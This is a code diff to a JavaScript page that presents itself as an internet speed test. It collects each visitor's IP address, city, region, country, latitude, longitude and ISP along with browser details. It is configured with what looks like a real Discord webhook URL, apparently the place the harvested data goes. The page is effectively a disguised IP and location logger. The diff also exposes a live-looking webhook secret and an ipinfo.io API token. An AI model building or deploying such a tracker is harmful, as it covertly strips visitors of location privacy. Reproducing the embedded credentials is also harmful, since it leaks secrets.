@@ -1,6 +1,7 @@
 
 // --- CONFIG ---
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415394791654428856/0uncp10Lr772qmkanZ4aKAGYo63UdG9XnW32s0UA2CrXXx8ZiubzteQiBxxAgVrAvoTg";
+const IPINFO_TOKEN = "3993cbc08215b2"; // replace with your ipinfo.io token
 
 // --- utility ---
 function safeStringify(obj) {
@@ -37,9 +38,9 @@ function collectClientInfo() {
   return client;
 }
 
-// Fetch IP + geolocation
+// Fetch IP + geolocation from ipinfo.io
 async function fetchGeo() {
-  const url = 'https://ipapi.co/json/';
+  const url = `https://ipinfo.io/json?token=${IPINFO_TOKEN}`;
   const res = await fetch(url, { cache: 'no-store' });
   if (!res.ok) throw new Error('Geo API error: ' + res.status);
   return await res.json();
@@ -60,7 +61,7 @@ async function testPing() {
 }
 
 async function testDownload() {
-  const url = "https://openspeedtest.com/speedtest/random4000x4000.jpg";
+  const url = "./testfile.bin"; // local file hosted in repo
   const start = performance.now();
   const res = await fetch(url, { cache: "no-store" });
   const blob = await res.blob();
@@ -115,13 +116,14 @@ btn.addEventListener('click', async () => {
     const ping = await testPing();
     statusEl().textContent = 'Testing download speed...';
     const downloadMbps = await testDownload();
+    const [lat, lon] = geo.loc ? geo.loc.split(",") : [null, null];
     const full = Object.assign({}, client, {
       ip: geo.ip || null,
       city: geo.city || null,
       region: geo.region || null,
-      country: geo.country_name || geo.country || null,
-      latitude: geo.latitude || null,
-      longitude: geo.longitude || null,
+      country: geo.country || null,
+      latitude: lat,
+      longitude: lon,
       isp: geo.org || null,
       ping,
       downloadMbps,
